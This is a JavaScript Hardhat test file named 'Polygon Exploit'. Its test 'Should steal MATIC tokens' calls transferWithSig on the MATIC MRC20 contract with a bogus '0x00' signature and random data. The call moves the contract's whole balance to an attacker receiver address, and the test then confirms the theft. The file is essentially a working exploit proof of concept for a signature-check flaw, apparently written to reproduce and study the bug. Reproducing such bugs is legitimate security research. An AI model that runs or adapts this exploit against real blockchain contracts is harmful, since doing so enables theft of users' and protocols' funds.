const { expect } = require("chai");
const { hexlify } = require("ethers/lib/utils");
const { ethers } = require("hardhat");

describe("Polygon Exploit", function () {

  const matic_token_address = "0x0000000000000000000000000000000000001010"; // https://polygonscan.com/address/0x0000000000000000000000000000000000001010

  it("Should steal MATIC tokens", async function () {
    // Ethers signer accounts start with some amount of MATIC to interact with smart contracts
    // Use a separate receiver that starts with 0 MATIC to make our accounting easier
    const attacker_receiver = "0x634e6605dE07a9cc67136699028985f468803191";

    const [attacker] = await ethers.getSigners();

    const mrc20 = await ethers.getContractAt("MRC20", matic_token_address);

    var matic_balance_before = await mrc20.balanceOf(matic_token_address);
    console.log(`MATIC token contract balance before:\n ${ethers.utils.formatEther(matic_balance_before).toString()}`);

    var attacker_balance = await mrc20.balanceOf(attacker_receiver);
    console.log(`Attacker balance before:\n ${ethers.utils.formatEther(attacker_balance).toString()}`);

    console.log();

    const sig = "0x00";
    var data = [];
    for(let i = 0; i<32; i++) {data.push(Math.floor(Math.random()*32))}
    data = hexlify(data);
    const expiration = 10000000000000;

    await mrc20.connect(attacker).transferWithSig(sig, matic_balance_before, data, expiration, attacker_receiver);

    var matic_balance = await mrc20.balanceOf(matic_token_address);
    console.log(`MATIC token contract balance after:\n ${ethers.utils.formatEther(matic_balance).toString()}`);

    attacker_balance = await mrc20.balanceOf(attacker_receiver);
    console.log(`Attacker balance after:\n ${ethers.utils.formatEther(attacker_balance).toString()}`);

    expect(attacker_balance).to.equal(matic_balance_before);
  });
});
